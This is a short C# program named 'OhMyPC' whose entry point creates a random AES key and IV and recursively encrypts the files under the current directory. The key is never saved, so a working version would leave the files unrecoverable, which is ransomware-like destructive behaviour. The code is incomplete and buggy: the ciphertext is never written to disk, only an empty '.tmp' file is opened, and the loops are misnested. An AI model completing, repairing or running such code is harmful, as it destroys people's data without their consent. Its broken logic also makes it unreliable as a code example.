using System.Diagnostics;
using System.Reflection.PortableExecutable;
using System.Security.Cryptography;
using System.Text;

namespace OhMyPC
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var key = RandomNumberGenerator.GetBytes(32);var iv = RandomNumberGenerator.GetBytes(16);FileEncrypt.Recurse(Environment.CurrentDirectory, iv, key);
            
            return;
        }
        public static void WriteLineAsColor(string Text,ConsoleColor color)
        {
            var dcolor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.WriteLine(Text);
            Console.ForegroundColor = dcolor;
        }
    }
    class FileEncrypt
    {
        public static void Recurse(string FilePath,byte[] IV,byte[] Key)
        {

            foreach (var d in Directory.EnumerateDirectories(FilePath))
            {
                Recurse(d, IV, Key);
                foreach (var Files in Directory.EnumerateFiles( FilePath))
                {
                    FileEncrypt.Enceypt(Files, IV, Key);
                }
            }
            return;
        }
        static void Enceypt(string FilePath,byte[] IV,byte[] Key)
        {

            var aes = AesCng.Create(); aes.IV = IV; aes.Key = Key;

            try
            {
                var bytes = File.ReadAllBytes(FilePath);
                var enc=aes.EncryptCbc(bytes, IV);
                FileStream fileStream = new(FilePath + ".tmp", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.ReadWrite);

            }
            catch (Exception)
            {

                throw;
            }


        }
    }

}
